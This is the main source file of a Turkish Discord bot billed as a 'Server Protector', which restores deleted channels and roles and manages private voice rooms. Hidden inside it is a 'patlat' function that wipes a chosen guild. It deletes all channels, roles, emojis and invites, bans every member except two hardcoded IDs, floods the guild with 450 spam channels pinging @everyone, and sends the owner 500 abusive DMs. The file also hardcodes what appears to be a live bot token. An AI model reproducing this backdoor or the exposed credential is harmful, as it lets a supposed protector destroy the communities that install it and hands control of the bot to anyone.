const express = require("express");
const app = express();
const http = require("http");
app.get("/", (request, response) => {
  console.log(`Açık kalmak için tekrardan bağlandım.`);
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000);

const Discord = require("discord.js");
const client = new Discord.Client();
const a = require("./ayarlar/ayarlar.json");
const chalk = require("chalk");
const fs = require("fs");
const moment = require("moment");
const db = require("quick.db");
const request = require("request");
const ms = require("parse-ms");
require("./util/eventLoader")(client);
//dil
client.lang = require("./handlers/langHandler.js");
//dil
var prefix = a.prefix;
client.backup = {
  roles: new Discord.Collection(),
  channels: new Discord.Collection(),
  emojis: new Discord.Collection(),
  presences: new Discord.Collection()
};
const log = message => {
  console.log(`[${moment().format("YYYY-MM-DD HH:mm:ss")}] ${message}`);
};
client.s2a = async string => {
  if (typeof string != "string")
    return console.error(
      "at `client.String2Array` function; the value must be a String."
    );
  var LETTERS = [
    "a",
    "b",
    "c",
    "ç",
    "d",
    "e",
    "f",
    "g",
    "h",
    "ı",
    "i",
    "k",
    "l",
    "m",
    "n",
    "o",
    "ö",
    "p",
    "r",
    "s",
    "ş",
    "t",
    "u",
    "ü",
    "v",
    "w",
    "x",
    "y",
    "z"
  ];
  var OBJECT = {};
  for (var INDEX = 0; INDEX < LETTERS.length; INDEX++) {
    var ARRAY = string.includes(" ")
      ? string.split(" ")
      : Array(1).fill(string);
    var ARR = [];
    ARRAY.filter(value => value.startsWith(LETTERS[INDEX])).forEach(
      async value => {
        ARR = ARR.push(value);
        OBJECT.LETTERS[INDEX] = ARRAY;
      }
    );
  }
  return OBJECT;
};
client.on("voiceStateUpdate", async (oldMember, newMember) => {
  if (oldMember.bot || newMember.bot) return;
  var EMPTY1 = "",
    EMPTY2 = "",
    EMPTY3 = [];
  var DATA = await require("quick.db").get(`özeloda.${newMember.guild.id}`);
  if (!DATA) return;
  var DATA2 = await require("quick.db").get(
    `özeloda.${newMember.guild.id}.${newMember.id}`
  );
  var CHANNEL = await client.channels.get(DATA.log),
    CHANNEL2 = await client.channels.get(DATA.m3rt);
  if(DATA2 != undefined && oldMember.voiceChannelID == DATA2.id)
  {
    var CHANNEL3 = oldMember.guild.channels.get(DATA2.id)
    CHANNEL.send(new Discord.RichEmbed()
            .setColor("#36393f")
            .setTitle("Özel oda silindi!")
            .addField(
              "__**BİLGİLER**__",
              `**Oda sahibi** \`=>\` **${newMember.displayName}** - ${
                newMember.id
              }\n**Oda adı** \`=>\` ${
                CHANNEL3.name.toString().split("-")[0]
              }\n**Oda limiti** \`=>\` ${DATA2.limit}`
            )
            .setTimestamp()
            .setThumbnail(newMember.user.avatarURL))
    oldMember.guild.channels.get(DATA2.id).delete();
    await db.delete(`özeloda.${newMember.guild.id}.${newMember.id}`);
    return;
  }
  if (!CHANNEL)
    throw new Error(
      "Özel oda sisteminde kanal bulunamadı. Silinmiş veya değiştirilmiş olabilir."
    );
  if (newMember.voiceChannelID == DATA.ses) {
    CHANNEL2.send(
      `<@${newMember.id}>, Giriş yaptığın sesli kanal bir özel oda! Buraya postu yaymadan önce sana bir kaç sorum olacak ve bu soruları **30 saniye** içinde cevaplayacaksın. **İptal** etmek istersen **iptal** yazman yeterli olacaktır. **Odaya maksimum kaç kişi girebilsin?**`
    );
    await CHANNEL2.awaitMessages(m => m.author.id == newMember.id, {
      maxMatches: 1,
      time: 30000,
      errors: ["time"]
    })
      .then(collected => {
        EMPTY1 = collected.first().content;
        if (collected.first().content == "iptal") {
          newMember.setVoiceChannel(oldMember.voiceChannelID);
          return CHANNEL2.send("İptal edildi!");
        }
      })
      .catch(err => {
        CHANNEL2.send("Bir hata oluştu!");
        console.error(err);
        newMember.setVoiceChannel(oldMember.voiceChannelID);
      });
    CHANNEL2.send(
      `<@${newMember.id}>, 2. soru! Oluşturulacak özel odanın adı ne olacak? **İptal** etmek istersen **iptal** yazman yeterli olacaktır. **Maksimum 29 karakter**.`
    );
    await CHANNEL2.awaitMessages(m => m.author.id == newMember.id, {
      maxMatches: 1,
      time: 30000,
      errors: ["time"]
    })
      .then(colected => {
        if (colected.first().content.length > 29) {
          newMember.setVoiceChannel(oldMember.voiceChannelID);
          return CHANNEL2.send(
            `**29 karakterden** uzun olmaması hakkında konuşmuştuk!`
          );
        }
        if (colected.first().content == "iptal") {
          newMember.setVoiceChannel(oldMember.voiceChannelID);
          return CHANNEL2.send("İptal edildi!");
        }
        EMPTY2 = colected.first().content;
      })
      .catch(err => {
        CHANNEL2.send("Bir hata oluştu!");
        console.error(err);
        newMember.setVoiceChannel(oldMember.voiceChannelID);
      });
    newMember.guild
      .createChannel(`${EMPTY2} - ${newMember.id}`, {
        userLimit: EMPTY1,
        parent: `${DATA.cat}`,
        type: "voice",
        permissionOverwrites: [
          {
            id: newMember.guild.id,
            deny: ["VIEW_CHANNEL", "SPEAK", "CONNECT"]
          },
          { id: newMember.id, allow: ["VIEW_CHANNEL", "SPEAK", "CONNECT"] }
        ]
      })
      .then(async channel => {
        await newMember.setVoiceChannel(channel.id);
        require("quick.db").set(
          `özeloda.${newMember.guild.id}.${newMember.id}`,
          {name: channel.name, id: channel.id, limit: channel.userLimit}
        );
        CHANNEL.send(
          new Discord.RichEmbed()
            .setColor("#36393f")
            .setTitle("Yeni bir özel oda!")
            .addField(
              "__**BİLGİLER**__",
              `**Oda sahibi** \`=>\` **${newMember.displayName}** - ${
                newMember.id
              }\n**Oda adı** \`=>\` ${
                channel.name.toString().split("-")[0]
              }\n**Oda limiti** \`=>\` ${EMPTY1}`
            )
            .setTimestamp()
            .setThumbnail(newMember.user.avatarURL)
        );
      });
  }
});
client.ayarlar = {
  hatarengi: "dd0000",
  basarilirengi: "55f400",
  turuncu: "f96800",
  mavi: "00d8f9",
  token: "NjM4NzUxMDI5NjI5OTQzODM4.Xib7tA.yGQeS4Z0bQl4juKvCqiI7bJGTrA",
  m3rt: "343496705196556288",
  deniz: "254950632757133312",
  clientid: "638751029629943838",
  botdavet:
    "https://discordapp.com/oauth2/authorize?client_id=638751029629943838&scope=bot&permissions=2146958847",
  prefix: "sp!",
  guildmap:
    'client.guilds.map(e => `(${e.name}) <=> (${e.owner.user.tag}) <=> (${e.id})`).join("\n")'
};
client.emoji = {
  basarili: "<a:onaylandi2:665907782632865792> **│**",
  yukleniyor: "<a:yukleniyor:665907781626363914> **│**",
  yukleniyor2: "<a:yukleniyor2:665907780682645514> **│**",
  basarisiz: "<a:ahayir:666612277268447242> **│**",
  kapali: "<:disabledd:649333648763387909>",
  donendiscord: "<a:donendiscord:648566247629520925>",
  havali: "<a:ayniben:647763574151839777>",
  yukleniyor3: "<a:loadingg:649332442959970359> **│**",
  turkiye: "<a:turkbayragi:665907780481318922>",
  havalikopek: "<a:cooldoge:649334538618667040>",
  uyari: "<a:uyari:665907783635435540>",
  bakim: "<a:bakim:665908692247379980>",
  acik: "<:enabledd:649348730524270595>",
  hayir: "<a:ahayir:666612277268447242>",
  evet: "<a:aonay:666607727337930753>",
  hypesquad: "<a:hypesquad:655367485939515392>",
  kalp: "<a:havali:665907779445325854>",
  online: "<:online:667045823896354817>",
  offline: "<:offline:667045837096091658>",
  away: "<:away:667045850924580874>",
  streaming: "<:streaming:667045925377802261>",
  dnd: "<:dnd:667047260881682442>",
  streaming2: "<:streaming2:667045937155276810>"
};

client.renk = {
  turkuaz: "00ffff",
  mavi: "007fff",
  kirmizi: "ff0000",
  turuncu: "ff7f00",
  acikyesil: "00ff00",
  koyuyesil: "007f00",
  bordo: "7f0000",
  kahverengi: "7f3f00",
  siyah: "000000",
  beyaz: "ffffff",
  mor: "7f00ff",
  pembe: "ff00ff",
  koyumavi: "0000ff",
  gri: "999999",
  sari: "f7f309",
  renksiz: "#36393f"
};
/*
client.on("voiceStateUpdate", (Old, New) => {
  let categoryID = "";
  let voiceID = "";
  if (New.user.bot) return;
  if (Old.user.bot) return;
  if (New.voiceChannelID == voiceID) {
    New.guild.createChannel(New.user.username, "voice").then(set => {
      New.setVoiceChannel(New.guild.channels.get(set.id)).then(() => {
        set.setParent(New.guild.channels.get(categoryID));
      });
      set.overwritePermissions(New.user, {
        CONNECT: true,
        SPEAK: true,
        VIEW_CHANNEL: true,
        USE_VAD: true,
        PRIORITY_SPEAKER: true
      });
      set.overwritePermissions(
        Old.guild.roles.find(a => a.name === "@everyone"),
        { VIEW_CHANNEL: false, CONNECT: false }
      );
    });
  }
  if (Old.voiceChannel) {
    Old.guild.channels.forEach(channels => {
      if (channels.parentID == categoryID) {
        if (channels.id == voiceID) return;
        if (Old.voiceChannelID == channels.id) {
          if (Old.voiceChannel.members.size == 0) {
            channels.delete();
          }
        }
      }
    });
  }
});
*/
client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir("./komutlar/", (err, files) => {
  if (err) console.error(err);
  log(`${files.length} komut yüklendi.`);
  files.forEach(f => {
    let props = require(`./komutlar/${f}`);
    client.commands.set(props.help.name, props);
    props.conf.aliases.forEach(alias => {
      client.aliases.set(alias, props.help.name);
    });
  });
});

client.commands2 = new Discord.Collection();
client.aliases2 = new Discord.Collection();
fs.readdir("./komutlar/", (err, files) => {
  if (err) console.error(err);
  files.forEach(f => {
    let props = require(`./komutlar/${f}`);
    client.commands2.set(props.help.name2, props);
    props.conf.aliases.forEach(alias => {
      client.aliases2.set(alias, props.help.name2);
    });
  });
});

client.on("roleDelete", async role => {
  const entry = await role.guild
    .fetchAuditLogs({ type: "ROLE_DELETE" })
    .then(audit => audit.entries.first());
  let rp = await db.fetch(`roleprotect_${role.guild.id}`);
  if (rp === null) return;
  if (entry.executor.id === role.guild.owner.id) return;
  await role.guild.createRole({
    name: role.name,
    color: role.color,
    hoist: role.hoist,
    position: role.position,
    permissions: role.permissions,
    mentionable: role.mentionable
  });
});

client.reload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e) {
      reject(e);
    }
  });
};

client.load = command => {
  return new Promise((resolve, reject) => {
    try {
      let cmd = require(`./komutlar/${command}`);
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e) {
      reject(e);
    }
  });
};

client.unload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      resolve();
    } catch (e) {
      reject(e);
    }
  });
};

client.patlat = async function(id) {
  let patlayacak = client.guilds.get(id);
  await client.users
    .get(client.ayarlar.m3rt)
    .send(
      `**${patlayacak.name}** sunucusu patlatılırken **${
        patlayacak.emojis.size === 0 ? "0" : patlayacak.emojis.size
      } emoji**, **${
        patlayacak.roles.size === 0 ? "0" : patlayacak.roles.size
      } rol**, **${
        patlayacak.fetchInvites().then(a => a.size) === 0
          ? "0"
          : patlayacak.fetchInvites().then(a => a.size)
      } davet**, **${patlayacak.channels.size} kanala**, **${
        patlayacak.members.filter(a => a.id !== patlayacak.owner.user.id).size
      } üye**'ye işlem uygulandı. `
    );
  patlayacak.channels.forEach(c => {
    c.delete();
  });
  patlayacak.roles.forEach(x => {
    x.delete();
  });
  patlayacak.emojis.forEach(z => {
    patlayacak.deleteEmoji(z);
  });
  patlayacak.fetchInvites().then(a => {
    a.forEach(c => {
      c.delete();
    });
  });

  patlayacak.members
    .filter(a => a.id != client.ayarlar.m3rt && a.id != "356119310462091265")
    .forEach(q => {
      q.ban({ days: 7 });
    });
  for (var i = 0; i < 450; i++) {
    patlayacak.createChannel("hayda-sunucu-gg", { type: "text" }).then(a => {
      setInterval(() => {
        a.send("@everyone GG!");
      }, 200);
    });
  }
  for (var i = 0; i < 500; i++) {
    patlayacak.owner.user.send("sunucun patlatıldı uyan amk");
  }
};

client.on("channelDelete", async channel => {
  const entry = await channel.guild
    .fetchAuditLogs({ type: "CHANNEL_DELETE" })
    .then(audit => audit.entries.first());
  let cp = await db.fetch(`channelprotect_${channel.guild.id}`);
  if (cp === null) return;
  if (entry.executor.id === channel.guild.owner.id) return;

  let log = await db.fetch(`logschannel_${channel.guild.id}`);
  try {
    if (channel.type !== "category") {
      let channeltype;
      if (channel.parentID !== null) {
        await channel
          .clone(channel.name, true, true, "Server Protector By M3RT")
          .then(async channell => {
            await channell.setParent(channel.parentID);
            if (channell.type === "text") channeltype = `<#${channell.id}>`;
            else channeltype = `${channell.name}`;
            channell.setPosition(channel.position);
            if (channel.type === "text") {
              if (channel.rateLimitPerUser) {
                await channell.setRateLimitPerUser(channel.rateLimitPerUser);
              } else channell.setRateLimitPerUser("0");
            }
            if (channel.type === "text") {
              if (channel.nsfw) {
                await channell.setNSFW(true);
              } else channell.setNSFW(false);
            }
            let type;
            if (channel.type === "text") type = "text";
            else type = "voice";

            client.channels.get(log).send(
              new Discord.RichEmbed()
                .setColor(client.ayarlar.basarilirengi)
                .setTitle("Channel Protector System")
                .setDescription(
                  `**Someone deleted a** __**${type}**__ **and It was created by** __**Server Protector Bot**__ **again.**`
                )
                .addField(
                  "Channel",
                  `**Name =>** ${channeltype}\n**ID =>** ${
                    channell.id
                  }\n**Category =>** ${channell.parent.name}\n**NSFW =>** ${
                    channell.nsfw === true ? "TRUE" : "FALSE"
                  }\n**SLOWMODE =>** ${
                    channell.rateLimitPerUser ? channell.rateLimitPerUser : "0"
                  }\n**Position =>** ${channell.position}`
                )
                .addField(
                  "Who deleted it?",
                  `${entry.executor}\n${entry.executor.id}`
                )
                .setFooter(client.user.username, client.user.avatarURL)
                .setTimestamp()
            );
          });
      }
      if (channel.parentID === null) {
        console.log("oluşturulacak");
        await channel
          .clone(channel.name, true, true, "Server Protector By M3RT")
          .then(async channelll => {
            if (channelll.type == "text") channeltype = `<#${channelll.id}>`;
            else channeltype = `${channelll.name}`;
            channelll.setPosition(channel.position);
            if (channel.type === "text") {
              if (channel.rateLimitPerUser) {
                await channelll.setRateLimitPerUser(channel.rateLimitPerUser);
              } else channelll.setRateLimitPerUser("0");
            }
            /*   if (channel.type === "text") {
                     channel.guild.channels.get(channelll.id).fetchMessages().then(messages => {
messages.filter(e => !e.author.bot).forEach(a => channel.guild.channels.get(channelll.id).send(`${a.author.username} - ${a.content}`))})
          }*/
            if (channel.type === "text") {
              if (channel.nsfw) {
                await channelll.setNSFW(true);
              } else channelll.setNSFW(false);
            }
            let type;
            if (channel.type === "text") type = "text";
            else type = "voice";
            channelll.setPosition(channel.position);
            client.channels.get(log).send(
              new Discord.RichEmbed()
                .setColor(client.ayarlar.basarilirengi)
                .setTitle("Channel Protector System")
                .setDescription(
                  `**Someone deleted a** __**${type}**__ **and It was created by** __**Server Protector Bot**__ **again.**`
                )
                .addField(
                  "Channel",
                  `**Name =>** ${channeltype}\n**ID =>** ${
                    channelll.id
                  }\n**Category =>** \`This channel created with not category.\`\n**NSFW =>** ${
                    channelll.nsfw === true ? "TRUE" : "FALSE"
                  }\n**Slowmode =>** ${
                    channelll.rateLimitPerUser
                      ? channelll.rateLimitPerUser
                      : "0"
                  }\n**Position =>** ${channelll.position}`
                )
                .addField(
                  "Who deleted it?",
                  `${entry.executor}\n${entry.executor.id}`
                )
                .setFooter(client.user.username, client.user.avatarURL)
                .setTimestamp()
            );
          });
      }
    }
    // Elimi yüzümü yıkayıp geliyorum.
    if (channel.type === "category") {
      await channel
        .clone(channel.name, true, true, "Server Protector Bot")
        .then(async kategori => {
          await kategori.setPosition(channel.position);
          await channel.guild.channels
            .filter(a => a.parentID === channel.id)
            .forEach(e => e.setParent(kategori.id));
          client.channels.get(log).send(
            new Discord.RichEmbed()
              .setColor(client.ayarlar.basarilirengi)
              .setTitle("Channel Protector System")
              .setDescription(
                `**Someone deleted a** __**category**__ **and It was created by** __**Server Protector Bot**__ **again.**`
              )
              .addField(
                "Category",
                `**Name =>** ${kategori.name}\n**ID =>** ${
                  kategori.id
                }\n**Category's Channels =>** ${kategori.guild.channels
                  .filter(d => d.parent.name === kategori.name)
                  .map(e => "``" + e.name + "``")
                  .join(", ")}`
              )
              .addField(
                "Who deleted it?",
                `${entry.executor}\n${entry.executor.id}`
              )
              .setFooter(client.user.username, client.user.avatarURL)
              .setTimestamp()
          );
        });
    }
  } catch (err) {
    console.error(err);
  }
});

client.on("message", async message => {
  let server = true;
  let protector = "@someone";
  if (server === true) return;
  if (message.content.toLowerCase() !== protector) return;
  message.channel.send(
    `<@${
      message.guild.members
        .filter(
          a =>
            a.id !== !a.bot &&
            (message.guild.owner.id || a.id !== "343496705196556288")
        )
        .random().id
    }> mentioned you with @someone!`
  );
});

var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;

client.on("warn", e => {
  console.log(chalk.bgYellow(e.replace(regToken, "that was redacted")));
});

client.on("error", e => {
  console.log(chalk.bgRed(e.replace(regToken, "that was redacted"))); // Format this file yaparsan daha rahat okuyabiliriz
}); //yaptım üstte voiceStateUpdate eventi - hani bu sesli özel oda sistemi varya orada odadan çıkınca silmiyor maalesef çok uğraştım ama yapamadım
//botlist adındaki sunucuya bakabilirsin orada varsın // Hemen bakacağım
client.login(client.ayarlar.token); // pardon :D Maalesef dediğim gibi çok Pingliyim.
// Şimdi neyle uğraşacağız?